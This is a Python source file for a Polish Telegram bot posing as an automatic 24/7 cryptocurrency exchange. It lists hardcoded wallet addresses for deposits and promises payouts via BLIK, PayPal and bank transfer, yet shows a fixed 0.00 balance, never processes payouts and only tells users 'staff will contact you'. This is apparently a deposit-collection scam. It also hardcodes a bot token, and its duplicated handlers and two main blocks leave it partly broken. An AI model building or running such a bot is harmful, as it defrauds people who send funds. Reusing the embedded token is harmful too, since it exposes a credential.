import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackContext, CallbackQueryHandler

# --- KONFIGURACJA ---
BOT_TOKEN = os.getenv("BOT_TOKEN") or "7725138343:AAEXXIz0nCk6tn0vx6X1lI7b5Ex_iM9NhKI"
ADMIN_ID = 6178640111  # Wstaw swoje ID Telegram (int)

# --- DANE STAŁE ---
crypto_wallets = {
    "Bitcoin (BTC)": "bc1qsnq04cr8mzyna6yr047g4vrl43rzfhr0ppt63y",
    "Ethereum (ETH Network)": "0x6d6F438B2c629A19816F2D07C721bD7C617981d2",
    "Tether USDT (ETH Network)": "0x6d6F438B2c629A19816F2D07C721bD7C617981d2",
    "Litecoin (LTC)": "LWXm8AZ9b18gtQkGM42XPhCH1h48XED8oo"
}

withdraw_methods = [
    "Kod Blik", "Przelew bankowy", "PayPal", "Revolut", "Zen"
]

from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# --- HANDLERY ---
async def start(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("📥 Wpłać krypto", callback_data='deposit')],
        [InlineKeyboardButton("📤 Wypłać środki", callback_data='withdraw')],
        [InlineKeyboardButton("💰 Sprawdź saldo", callback_data='balance')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    photo_url = "https://imgur.com/a/xBGaXs7.jpg"  

    await update.message.reply_photo(
        photo=photo_url,
        caption=(
            "<b>🤖 WITAMY W AUTOMATYCZNYM KANTORZE KRYPTOWALUT!</b>\n\n"
            
            "💸 Wymieniaj <b>Bitcoin, USDT, ETH, Litecoin</b>\n"
            "➡️ Na <b>Kod Blik, PayPal, Revolut, Zen, Przelew Bankowy</b>\n\n"
            
            "✂️ Pobieramy tylko <b>8%</b> niezaleznie od kwoty!\n"
            
            "• Wymienimy ci <b>min. 150PLN, max 50 000PLN</b>\n"
        
            "<b>Niezależnie od godziny – działamy non stop, 24/7. Wymieniaj kiedy chcesz.</b>\n"

            "👇 Wybierz opcję:"
        ),
        reply_markup=reply_markup,
        parse_mode="HTML"
    )
# Obsługa kliknięcia przycisków
async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    if query.data == 'deposit':
        await query.edit_message_text(
            "<b>🔐 Wybierz kryptowalutę do wpłaty:</b>\n\n"
            "🪙 <b>Bitcoin (BTC)</b>\n<code>bc1qsnq04cr8mzyna6yr047g4vrl43rzfhr0ppt63y</code>\n\n"
            "💵 <b>USDT (ETH)</b>\n<code>0x6d6F438B2c629A19816F2D07C721bD7C617981d2</code>\n\n"
            "🌐 <b>Ethereum (ETH)</b>\n<code>0x6d6F438B2c629A19816F2D07C721bD7C617981d2</code>\n\n"
            "💠 <b>Litecoin (LTC)</b>\n<code>LWXm8AZ9b18gtQkGM42XPhCH1h48XED8oo</code>",
            parse_mode="HTML"
             )
    elif query.data == 'withdraw':
        await query.edit_message_text(
            "<b>💸 Wypłata dostępna przez:</b>\n\n"
            "- Kod BLIK\n- Czek BLIK\n- Przelew bankowy\n- PayPal\n- Revolut\n- Zen",
            parse_mode="HTML"
        )
    elif query.data == 'balance':
        await query.edit_message_text(
            "<b>💰 Twoje saldo:</b>\n0.00 PLN",
            parse_mode="HTML"
        )

# Uruchomienie bota
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("Bot działa...")
    app.run_polling()


async def deposit(update: Update, context: CallbackContext):
    keyboard = [[InlineKeyboardButton(name, callback_data=f"crypto|{name}")] for name in crypto_wallets.keys()]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("💰 Wybierz kryptowalutę do wpłaty:", reply_markup=reply_markup)

async def withdraw(update: Update, context: CallbackContext):
    keyboard = [[InlineKeyboardButton(method, callback_data=f"withdraw|{method}")] for method in withdraw_methods]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("💸 Wybierz metodę wypłaty:", reply_markup=reply_markup)

async def balance(update: Update, context: CallbackContext):
    await update.message.reply_text("📉 Twoje saldo: 0.00 PLN")

async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    if data.startswith("crypto|"):
        _, name = data.split("|")
        address = crypto_wallets.get(name, "Brak adresu")
        await query.edit_message_text(f"🔗 Adres do wpłaty {name}:\n`{address}`", parse_mode='Markdown')

    elif data.startswith("withdraw|"):
        _, method = data.split("|")
        await query.edit_message_text(f"✅ Wybrałeś metodę wypłaty: {method}\nObsługa skontaktuje się z Tobą wkrótce.")

async def check_admin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("⛔ Brak dostępu.")
    await update.message.reply_text("🛡️ Panel admina — brak automatycznego monitoringu. Sprawdź saldo w portfelu ręcznie.")

# --- START ---
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("deposit", deposit))
    app.add_handler(CommandHandler("withdraw", withdraw))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("check_admin", check_admin))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 Bot działa...")
    app.run_polling()
